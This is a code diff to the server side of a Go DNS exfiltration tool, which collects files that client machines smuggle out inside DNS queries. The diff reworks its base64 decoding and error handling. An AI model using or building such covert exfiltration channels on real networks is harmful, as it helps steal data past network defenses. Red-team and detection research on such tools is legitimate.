@@ -43,18 +43,18 @@ func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
 	}
 }
 
-func decodeFromModifiedBase64(modifiedBase64Data string) []byte {
+func decodeFromModifiedBase64(modifiedBase64Data string) ([]byte, error) {
 	base64Data := strings.Replace(modifiedBase64Data, "-", "=", -1)
-	data, err := base64.URLEncoding.DecodeString(base64Data)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	return data
+	return base64.URLEncoding.DecodeString(base64Data)
 }
 
-func getFilePathFromEncodedFilename(dir string, encodedFilename string) string {
-	filename := decodeFromModifiedBase64(encodedFilename)
-	return path.Join(dir, string(filename))
+func getFilePathFromEncodedFilename(dir string, encodedFilename string) (string, error) {
+	filename, err := decodeFromModifiedBase64(encodedFilename)
+	if err != nil {
+		errorMsg := fmt.Sprintf("Unable to decode filename: %s", encodedFilename)
+		return "", errors.New(errorMsg)
+	}
+	return path.Join(dir, string(filename)), nil
 }
 
 func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer string) {
@@ -93,14 +93,26 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 		switch msgType {
 		case DNS_FILE_START.String():
 			fileutils.CreateDirIfNotExists(clientDir)
-			filename := getFilePathFromEncodedFilename(clientDir, data)
+			filename, err := getFilePathFromEncodedFilename(clientDir, data)
+			if err != nil {
+				log.Println(err)
+				continue
+			}
 			file := fileutils.CreateFileIfNotExists(filename)
 			ex.openFiles[machineId][filename] = file
 		case DNS_FILE_END.String():
-			filename := getFilePathFromEncodedFilename(clientDir, data)
+			filename, err := getFilePathFromEncodedFilename(clientDir, data)
+			if err != nil {
+				log.Println(err)
+				continue
+			}
 			file := ex.openFiles[machineId][filename]
-			decodedData := decodeFromModifiedBase64(string(ex.unprocessedData[machineId]))
-			_, err := file.Write(decodedData)
+			decodedData, err := decodeFromModifiedBase64(string(ex.unprocessedData[machineId]))
+			if err != nil {
+				log.Println("Unable to decode data for file: ", filename)
+				continue
+			}
+			_, err = file.Write(decodedData)
 			if err != nil {
 				log.Fatalln(err)
 			}
@@ -112,7 +124,7 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 		case DNS_FILE_DATA.String():
 			ex.unprocessedData[machineId] = append(ex.unprocessedData[machineId], data...)
 		default:
-			log.Printf("Unknown message type: '%s'", msgType)
+			log.Printf("Unknown message type: '%s'\n", msgType)
 		}
 
 		var reply dns.Msg
